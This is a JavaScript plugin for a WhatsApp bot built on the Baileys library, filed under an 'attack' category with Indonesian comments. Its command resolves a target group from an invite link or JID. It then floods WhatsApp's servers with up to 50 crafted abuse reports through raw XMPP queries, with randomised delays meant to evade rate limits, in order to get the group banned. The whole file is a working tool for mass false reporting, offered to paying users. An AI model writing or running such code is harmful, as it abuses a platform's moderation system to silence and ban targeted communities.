// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  Lolpop MD — Plugin Attack: Ban Group
//  Report-flood grup via invite link / JID (Baileys)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

import settings from "../../settings.js";

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// reason: 1=spam 2=inappropriate 3=hate 4=violence 5=scam ...
const REASON_MAP = {
  spam: 1,
  inappropriate: 2,
  hate: 3,
  violence: 4,
  scam: 5,
  "1": 1,
  "2": 2,
  "3": 3,
  "4": 4,
  "5": 5
};

/**
 * resolveGroupId — invite link / JID / bare id → @g.us
 */
async function resolveGroupId(sock, target) {
  target = String(target || "").trim();
  if (!target) throw new Error("Target kosong");

  // Invite link
  if (target.includes("chat.whatsapp.com/")) {
    const code = target.split("chat.whatsapp.com/").pop().split(/[/?#]/)[0];
    if (!code) throw new Error(`Tidak bisa parse invite code: ${target}`);

    // Baileys: groupGetInviteInfo
    const info = await sock.groupGetInviteInfo(code);
    if (!info?.id) throw new Error(`Invite invalid / expired: ${code}`);
    return info.id; // sudah @g.us
  }

  // Sudah JID grup
  if (target.endsWith("@g.us")) return target;

  // Bare number / id
  if (/^\d[\d\-]+$/.test(target)) return `${target}@g.us`;

  throw new Error(`Format target tidak dikenal: ${target}`);
}

/**
 * sendGroupReport — satu report signal via Baileys query
 * WA internal report path (XMPP iq)
 */
async function sendGroupReport(sock, jid, reason = 1) {
  // Baileys tidak expose Store.GroupReport seperti whatsapp-web.js.
  // Pakai query IQ report ke server WA.
  // node: "spam" | reason code tergantung build; kita kirim generic report.
  const result = await sock.query({
    tag: "iq",
    attrs: {
      to: "@s.whatsapp.net",
      type: "set",
      xmlns: "w:biz"
    },
    content: [
      {
        tag: "spam_list",
        attrs: {},
        content: [
          {
            tag: "spam",
            attrs: {
              jid,
              type: "group",
              reason: String(reason)
            }
          }
        ]
      }
    ]
  }).catch(async () => {
    // Fallback path — report via message action (beberapa build WA)
    return sock.query({
      tag: "iq",
      attrs: {
        to: jid,
        type: "set",
        xmlns: "w:g2"
      },
      content: [
        {
          tag: "report",
          attrs: { value: String(reason) }
        }
      ]
    });
  });

  return result;
}

function renderBar(pct) {
  const total = 5;
  const filled = Math.round((pct / 100) * total);
  return "▰".repeat(filled) + "▱".repeat(total - filled);
}

export default {
  meta: {
    name: "banGroup",
    command: ["bangroup", "ban", "reportgroup", "rg"],
    category: "attack",
    section: "⚔️ ATTACK",
    description: "Report-flood grup via invite link / JID",
    vip: true,
    premiumLimit: 15,
    owner: false,
    group: false,
    private: false
  },

  async run(sock, m, { args, command }) {
    const target = (args[0] || "").trim();
    const countRaw = parseInt(args[1], 10);
    const count = Math.min(Math.max(1, Number.isFinite(countRaw) ? countRaw : 20), 50);
    const reasonKey = String(args[2] || "1").toLowerCase();
    const reason = REASON_MAP[reasonKey] ?? 1;

    if (!target) {
      return m.reply(
        `❌ Format salah!\n\n` +
        `*Cara pakai:*\n` +
        `> .${command} <link|jid> [jumlah] [reason]\n\n` +
        `Contoh:\n` +
        `> .${command} https://chat.whatsapp.com/AbCdEf 25 spam\n` +
        `> .${command} 120363XXXXXXXXXX@g.us 20 1\n\n` +
        `Reason: 1=spam 2=inappropriate 3=hate 4=violence 5=scam\n` +
        `Jumlah: 1–50 (default 20)\n` +
        `Akses: *VIP* gratis | *Premium* -15 limit`
      );
    }

    // React
    try {
      await sock.sendMessage(m.chat, { react: { text: "⚔️", key: m.key } });
    } catch (_) {}

    // Resolve JID
    let groupId;
    try {
      groupId = await resolveGroupId(sock, target);
    } catch (e) {
      return m.reply(`❌ Gagal resolve target:\n> ${e.message}`);
    }

    // Placeholder progress
    const ph = await sock.sendMessage(
      m.chat,
      { text: `> ban ${groupId}\n> prepare...` },
      { quoted: m }
    );
    const phKey = ph.key;

    const result = { groupId, sent: 0, failed: 0, errors: [] };

    for (let i = 0; i < count; i++) {
      try {
        await sendGroupReport(sock, groupId, reason);
        result.sent++;
      } catch (err) {
        result.failed++;
        result.errors.push(`[${i + 1}] ${err.message}`);
      }

      // Progress edit tiap 5 report / akhir
      if ((i + 1) % 5 === 0 || i + 1 === count) {
        const pct = Math.round(((i + 1) / count) * 100);
        try {
          await sock.sendMessage(m.chat, {
            text:
              `> ban  ${renderBar(pct)} ${pct}%\n` +
              `> target : ${groupId}\n` +
              `> sent   : ${result.sent} | fail: ${result.failed}`,
            edit: phKey
          });
        } catch (_) {}
      }

      // Jitter 800–2200ms anti rate-limit
      await sleep(800 + Math.random() * 1400);
    }

    try {
      await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
    } catch (_) {}

    const status =
      result.failed === 0 ? "ALL OK" : result.sent > result.failed ? "OK" : "PARTIAL";

    const errPreview =
      result.errors.length > 0
        ? `\n\n_Error sample:_\n> ${result.errors.slice(0, 3).join("\n> ")}`
        : "";

    const report =
      `⌠ 𝗕𝗔𝗡 𝗚𝗥𝗢𝗨𝗣 ✓ ⌡\n` +
      `☇ group  : ${result.groupId}\n` +
      `☇ reason : ${reason}\n` +
      `☇ status : ${status}\n` +
      `☇ sent   : ${result.sent}\n` +
      `☇ failed : ${result.failed}` +
      errPreview +
      `\n\n_HARAP JEDA SEBELUM REPORT LAGI_`;

    await sock.sendMessage(m.chat, { text: report });
  }
};
